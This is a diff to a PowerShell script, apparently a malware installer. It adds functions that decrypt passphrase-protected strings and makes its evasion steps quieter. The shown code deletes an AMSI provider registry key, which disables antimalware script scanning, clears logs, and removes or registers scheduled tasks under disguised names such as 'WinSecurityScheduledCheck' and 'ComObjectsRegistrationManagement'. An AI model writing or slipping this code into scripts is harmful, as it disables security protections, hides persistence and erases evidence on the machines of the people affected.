@@ -34,6 +34,31 @@ Function OutString
 }
 
 
+function Set-Key {
+param([string]$string)
+$length = $string.length
+$pad = 32-$length
+if (($length -lt 16) -or ($length -gt 32)) {Throw "String must be between 16 and 32 characters"}
+$encoding = New-Object System.Text.ASCIIEncoding
+$bytes = $encoding.GetBytes($string + "0" * $pad)
+return $bytes
+}
+
+Function Decrypt-String($EncryptedString,$Passphrase)
+{
+    $EncryptionKey=Set-Key $Passphrase
+    Try{
+        $SecureString = ConvertTo-SecureString $EncryptedString -Key $EncryptionKey
+        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecureString)
+        [string]$String = [Runtime.InteropServices.Marshal]::PtrToStringAuto($bstr)
+        [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
+
+        Return $String
+    }
+    Catch{Throw $_}
+
+}
+
 Function Send-InstallNotification
 {
     param (
@@ -173,9 +198,9 @@ function Cleanup {
 
   # old tasks
   OutString "Cleanup: Unregister RemoteExecCheck,ScheduledSecurityCheck,WinSecurityScheduledCheck"
-  Unregister-ScheduledTask 'RemoteExecCheck'
-  Unregister-ScheduledTask 'WinSecurityScheduledCheck'
-  Unregister-ScheduledTask 'ScheduledSecurityCheck'
+  Unregister-ScheduledTask 'RemoteExecCheck' -ErrorAction Ignore
+  Unregister-ScheduledTask 'WinSecurityScheduledCheck' -ErrorAction Ignore
+  Unregister-ScheduledTask 'ScheduledSecurityCheck' -ErrorAction Ignore
 
   # logs
   OutString "Clera Logs"
@@ -186,7 +211,7 @@ function Cleanup {
 }
 
 # AMSI
-Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force
+Remove-Item -Path "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}" -Recurse -Force -ErrorAction Ignore 
 
 
 $NewTaskFolder='ComObjectsRegistrationManagement'
